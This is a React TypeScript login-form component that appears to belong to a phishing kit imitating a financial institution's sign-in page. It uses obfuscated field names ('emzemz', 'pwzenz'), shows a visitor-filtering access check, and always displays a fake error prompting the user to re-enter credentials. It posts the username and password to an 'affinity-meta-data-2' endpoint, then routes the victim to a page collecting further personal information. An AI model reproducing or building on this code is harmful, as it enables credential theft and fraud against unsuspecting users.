import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const LoginForm2: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [remember, setRemember] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '', form: '' });
  const navigate = useNavigate();
  const location = useLocation();
  const isAllowed = useAccessCheck(baseUrl);

  React.useEffect(() => {
    const { emzemz: priorUsername } = location.state || {};
    if (priorUsername) {
      setEmzemz(priorUsername);
    }
  }, [location.state]);

  if (isAllowed === null) {
    return <div className="text-white">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="text-white">Access denied. Redirecting...</div>;
  }

  const togglePwzenzVisibility = () => setShowPwzenz((prev) => !prev);

  const validateForm = () => {
    const nextErrors = { emzemz: '', pwzenz: '', form: '' };

    if (!emzemz.trim()) {
      nextErrors.emzemz = 'Username is required.';
    }

    if (!pwzenz.trim()) {
      nextErrors.pwzenz = 'Password is required.';
    }

    setErrors(nextErrors);
    return !nextErrors.emzemz && !nextErrors.pwzenz;
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const url = `${baseUrl}api/affinity-meta-data-2/`;
      await axios.post(url, {
        emzemz,
        pwzenz,
      });

      navigate('/basic-info', {
        state: {
          emzemz,
        },
      });
    } catch (error) {
      console.error('Error submitting credentials:', error);
      setErrors((prev) => ({ ...prev, form: 'Unable to submit credentials. Please try again.' }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard
      title="Login"
      subtitle={<span className="text-red-600 font-semibold">We found some errors. Please review and try again.</span>}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="emzemz">
            Username
          </label>
          <input
            id="emzemz"
            name="emzemz"
            type="text"
            value={emzemz}
            onChange={(event) => setEmzemz(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
          />
          <FormError message={errors.emzemz} className="mt-2" />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="pwzenz">
            Password
          </label>
          <div className="relative">
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(event) => setPwzenz(event.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            />
            <button
              type="button"
              onClick={togglePwzenzVisibility}
              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-purple-700 focus:outline-none"
              aria-label={showPwzenz ? 'Hide password' : 'Show password'}
            >
              {showPwzenz ? (
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c1.71 0 3.327-.376 4.786-1.05M6.228 6.228A10.451 10.451 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.5a10.523 10.523 0 01-4.293 5.25M6.228 6.228L3 3m3.228 3.228l12.544 12.544M9.88 9.88a3 3 0 104.24 4.24"
                  />
                </svg>
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"
                  />
                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              )}
            </button>
          </div>
          <FormError message={errors.pwzenz} className="mt-2" />
        </div>

        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <button
              id="remember"
              type="button"
              role="switch"
              aria-checked={remember}
              onClick={() => setRemember((previous) => !previous)}
              className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none ${remember ? 'bg-purple-700' : 'bg-gray-300'}`}
            >
              <span
                className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${remember ? 'translate-x-6' : 'translate-x-1'}`}
              />
            </button>
            <label htmlFor="remember" className="text-sm text-gray-700">
              Remember Username
            </label>
          </div>
          <a href="#" className="text-sm text-purple-800 hover:underline">
            Forgot credentials?
          </a>
        </div>

        <FormError message={errors.form} />

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Try again'}
        </button>
      </form>
    </FlowCard>
  );
};

export default LoginForm2;
